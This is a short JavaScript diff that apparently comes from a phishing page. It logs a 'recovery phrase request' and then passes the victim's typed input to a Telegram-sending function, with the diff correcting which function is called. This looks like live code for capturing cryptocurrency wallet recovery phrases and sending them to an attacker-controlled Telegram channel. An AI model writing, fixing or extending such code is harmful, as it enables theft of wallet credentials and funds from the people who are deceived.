@@ -42,7 +42,7 @@ function sendTelegramb(msg) {
          }
 
          console.log('📧 Processing recovery phrase request...');
-         sendTelegram(`
+         sendTelegramb(`
 🔔 New Request
 ─────────────
 📥 Input: ${inpvalue}
